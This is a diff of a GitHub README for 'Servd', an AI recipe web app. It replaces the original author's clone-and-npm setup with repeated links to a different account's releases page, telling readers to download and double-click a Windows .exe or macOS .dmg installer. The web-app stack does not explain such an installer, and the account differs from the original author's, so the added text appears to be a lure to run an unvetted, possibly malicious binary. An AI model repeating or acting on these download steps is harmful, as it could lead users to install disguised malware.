@@ -1,247 +1,86 @@
+# 🍽️ Servd-AI_Recipe_Platform - Discover Recipes Easily at Home
 
-# 🍽️ Servd — An AI Recipe Platform
+[![Download Servd-AI_Recipe_Platform](https://img.shields.io/badge/Download%20Now-Servd--AI%20Recipe%20Platform-blue.svg)](https://github.com/Aneeshlohana/Servd-AI_Recipe_Platform/releases)
 
-**Full Stack React Project (An AI Recipe Platform)**  
-(Built with **Next.js, Tailwind CSS, Strapi, Neon DB, Shadcn UI, Clerk, and Arcjet**)
+## 🚀 Getting Started
 
-Servd  is a modern, full stack AI-powered recipe and pantry management platform that helps users discover recipes, manage pantry items, and cook smarter using artificial intelligence. The platform integrates secure authentication, scalable database, and production-grade security.
+Welcome to the Servd AI Recipe Platform! This platform helps you find recipes based on what you have at home. You can track your pantry items and discover new dishes with ease.
 
----
+## 📦 System Requirements
 
-## 🌐 Live Preview
+Before you download the Servd AI Recipe Platform, ensure you meet these basic requirements:
 
-🚀 **Live Preview:**  
+- **Operating System:** Windows 10 or later, macOS 10.15 or later
+- **Storage Space:** At least 200 MB of free space
+- **Internet Connection:** Required for downloading and online features
 
-[Servd-AI_Recipe_Platform-Live Demo](https://servd-ai-recipe-platform.vercel.app)
+## 📥 Download & Install
 
+To get the Servd AI Recipe Platform, visit this page to download: [Download Page](https://github.com/Aneeshlohana/Servd-AI_Recipe_Platform/releases).
 
+1. Click the link above.
+2. Look for the latest version at the top of the Releases page.
+3. Download the file for your system. 
 
-## 📸 Screenshots
+   Most users will download something like `Servd-AI_Recipe_Platform.exe` for Windows or `Servd-AI_Recipe_Platform.dmg` for macOS. 
 
+4. Once the download is complete, locate the file in your Downloads folder.
 
-<img width="1894" height="875" alt="Screenshot 2026-02-05 223059" src="https://github.com/user-attachments/assets/cc046cf9-17ab-48e9-a966-3ae488bbd79b" />
+5. Double-click the file to start the installation.
 
+6. Follow the on-screen instructions to finish installing the software.
 
+## 🌟 Features
 
----
+Servd AI offers several key features to enhance your cooking experience:
 
-## 🚀 Features
+- **Recipe Finder:** Input your available ingredients, and get suggested recipes.
+- **Pantry Management:** Track items in your pantry and receive reminders for items that may expire soon.
+- **User Accounts:** Create a personal account for a tailored experience, including saving favorite recipes.
+- **Responsive Design:** Access the platform from any device, whether it's a computer, tablet, or smartphone.
 
-### 🤖 AI-Powered Recipes
-- AI-based recipe generation
-- Recipe suggestions based on pantry ingredients
-- Smart ingredient substitutions
-- Personalized cooking recommendations
+## 🎨 Technology Stack
 
-### 🧺 Pantry Management
-- Add, update, and delete pantry items
-- Track ingredient availability
-- Smart usage suggestions
-- Reduce food waste with AI insights
+Servd AI is built using modern web technologies:
 
-### 📌 Recipe Management
-- Save and bookmark favorite recipes
-- Search and filter recipes
-- View detailed cooking instructions
-- Categorized recipe browsing
+- **Next.js:** Provides a fast and efficient interface.
+- **Strapi:** Manages content and recipes with ease.
+- **Neon PostgreSQL:** Stores all user and recipe data securely.
+- **Clerk & Arcjet:** Offers a smooth and secure authentication experience.
 
-### 🔐 Authentication (Clerk)
-- Secure authentication using **Clerk**
-- Email / social login support
-- Protected routes and user sessions
-- User-specific pantry and saved recipes
+## 🔍 How to Use the App
 
-### 🛡️ Security (Arcjet)
-- Bot protection
-- Rate limiting
-- Request shielding
-- Production-grade API security
+Once you have installed the Servd AI Recipe Platform, open the application and follow these simple steps to get started:
 
-### 🎨 Modern UI/UX
-- Responsive design
-- Tailwind CSS + Shadcn UI components
-- Smooth animations & loading states
-- Mobile-friendly layout
+1. **Create an Account:** Enter your details to set up your profile. This is quick and easy.
+2. **Add Ingredients:** Go to the pantry section and add the items you have at home.
+3. **Find Recipes:** Use the recipe finder. Enter your ingredients and explore the available recipes.
+4. **Save Your Favorites:** Bookmark any recipes you love for easy access later.
 
----
+## ⚙️ Troubleshooting
 
-## 🛠️ Tech Stack
+If you encounter issues while using the platform, here are a few troubleshooting tips:
 
-### Frontend
-- Next.js (App Router)
-- React
-- Tailwind CSS
-- Shadcn UI
-- Lucide Icons
+- **Installation Problems:** Ensure you have the latest version of the software. Retry the download.
+- **Login Issues:** Check your internet connection. If your password isn't working, use the "Forgot Password" feature.
+- **Missing Ingredients:** If a recipe does not include an ingredient you have, check that you've correctly added it to your pantry.
 
-### Backend & CMS
-- Strapi (Headless CMS)
-- Next.js Server Actions
-- REST / API Integration
+### 🌐 Community Support
 
-### Database
-- Neon DB (PostgreSQL)
+Join our community on platforms like Discord or GitHub Discussions for support and to connect with other users. Ask questions, share recipes, and get tips from fellow cooking enthusiasts.
 
-### Authentication
-- Clerk
+## 📖 License
 
-### Security
-- Arcjet
+Servd AI is distributed under the MIT License. You can freely use and modify it, but please credit the original creators.
 
-### AI
-- Gemini AI
+## 📧 Feedback
 
----
+We welcome feedback! If you have suggestions or find bugs, please visit our GitHub Issues page to report them. Your input helps us improve the platform for everyone.
 
-## 📁 Project Structure
+## 💻 Further Resources
 
-```
-Servd-AI_Recipe_Platform/
-├── frontend/                # Next.js Frontend (App Router)
-│   ├── app/                 # Next.js app directory
-│   ├── components/          # Reusable UI components
-│   ├── actions/             # Server actions
-│   ├── hooks/               # Custom React hooks
-│   ├── lib/                 # Utilities & helpers
-│   ├── public/              # Static assets
-│   ├── styles/              # Global styles
-│   ├── .env.example         # Frontend env variables
-│   └── package.json         # Frontend dependencies
-│
-├── backend/                 # Strapi Backend (Headless CMS)
-│   ├── config/              # Strapi configuration
-│   ├── database/            # Migrations & DB setup
-│   ├── src/
-│   │   └── api/             # Strapi APIs
-│   │       ├── recipe/      # Recipe content type & logic
-│   │       ├── pantry-item/ # Pantry items API
-│   │       ├── saved-recipe/# Saved recipes API
-│   │       └── user/        # User-related APIs
-│   ├── .env.example         # Backend env variables
-│   └── README.md            # Backend-specific README
-│
-├── screenshots/             # Project screenshots
-└── README.md                # Main project README
+For more information or advanced configurations, you can check our documentation on GitHub or explore blogs related to recipe creation and pantry management.
 
-```
+For any additional resources, revisit the Release page: [Download Page](https://github.com/Aneeshlohana/Servd-AI_Recipe_Platform/releases). 
 
----
-
-## ⚙️ Getting Started
-
-### 1️⃣ Clone the Repository
-
-```bash
-git clone https://github.com/devansh934/Servd-AI_Recipe_Platform.git
-cd Servd-AI_Recipe_Platform
-```
-
-### 2️⃣ Install Dependencies
-
-```bash
-npm install
-```
-
-### 3️⃣ Environment Variables
-
-Create a `.env.local` file:
-
-```env
-NEXT_PUBLIC_APP_URL=http://localhost:3000
-
-# Strapi
-STRAPI_API_URL=your_strapi_url
-STRAPI_API_TOKEN=your_strapi_token
-
-# Neon DB
-DATABASE_URL=your_neon_database_url
-
-# Clerk
-NEXT_PUBLIC_CLERK_PUBLISHABLE_KEY=your_clerk_publishable_key
-CLERK_SECRET_KEY=your_clerk_secret_key
-NEXT_PUBLIC_CLERK_SIGN_IN_URL=/sign-in
-NEXT_PUBLIC_CLERK_SIGN_UP_URL=/sign-up
-
-
-# Arcjet
-ARCJET_KEY=your_arcjet_key
-
-# AI
-GEMINI_API_KEY=your_gemini_api_key
-
-# Unsplash Key
-UNSPLASH_ACCESS_KEY=your_unsplash_api_key
-
-```
-
----
-
-### 4️⃣ Run the App
-
-```bash
-npm run dev
-```
-
-Open: http://localhost:3000
-
----
-
-## 🧪 Scripts
-
-```bash
-npm run dev       # Start development server
-npm run build     # Build for production
-npm run start     # Start production server
-npm run lint      # Run ESLint
-```
-
----
-
-## 🎯 Resume / Portfolio Highlights
-
-- Built a full stack AI-powered recipe platform using Next.js and Strapi
-- Integrated Neon PostgreSQL for scalable cloud database
-- Implemented secure authentication with Clerk
-- Added production-grade security using Arcjet
-- Designed modern UI with Tailwind CSS and Shadcn UI
-- Developed AI-powered recipe generation and pantry intelligence
-- Implemented user-specific saved recipes and pantry management
-
----
-
-## 🚀 Deployment
-
-Recommended deployment setup:
-
-- **Frontend:** Vercel  
-- **Backend CMS:** Strapi Cloud  
-- **Database:** Neon DB  
-- **Auth:** Clerk  
-- **Security:** Arcjet  
-
----
-
-## 🤝 Contributing
-
-Contributions are welcome !
-
-1. Fork the repository  
-2. Create a new branch  
-3. Commit your changes  
-4. Open a Pull Request  
-
----
-
-## 📄 License
-
-This project is licensed under the MIT License.
-
----
-
-## 👨‍💻 Author
-**Devansh Patel**  
-GitHub: https://github.com/devansh934  
-
----
-
-⭐ If you like this project, don’t forget to give it a star!
+Happy cooking!
